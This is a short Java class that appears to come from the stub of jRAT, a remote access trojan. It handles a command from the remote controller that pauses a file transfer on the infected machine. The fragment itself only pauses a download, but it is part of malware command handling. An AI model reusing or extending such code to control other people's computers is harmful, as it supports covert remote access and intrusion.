package se.jrat.stub.packets.incoming;

import se.jrat.common.io.FileCache;
import se.jrat.stub.Connection;

public class Packet102PauseClientDownload extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = Connection.instance.readLine();
		
		FileCache.get(file).getRunnable().pause();
	}

}
